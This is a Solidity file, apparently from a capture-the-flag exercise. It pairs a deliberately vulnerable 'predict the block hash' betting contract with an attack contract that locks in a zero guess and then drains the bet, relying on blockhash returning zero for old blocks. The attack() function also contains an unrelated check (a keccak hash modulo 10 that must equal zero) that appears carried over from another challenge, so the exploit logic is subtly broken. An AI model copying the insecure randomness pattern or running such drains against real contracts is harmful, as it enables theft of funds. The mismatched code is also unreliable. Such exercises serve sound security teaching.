pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}


contract PredictTheBlockHashAttack {
    PredictTheBlockHashChallenge challenge;

    function PredictTheBlockHashAttack(address _challengeAddress) public payable {
        challenge = PredictTheBlockHashChallenge(_challengeAddress);
    }

    function lockInGuess() public payable {
        challenge.lockInGuess.value(1 ether)(0);
    }

    function attack() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        require(answer == 0);

        challenge.settle();
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
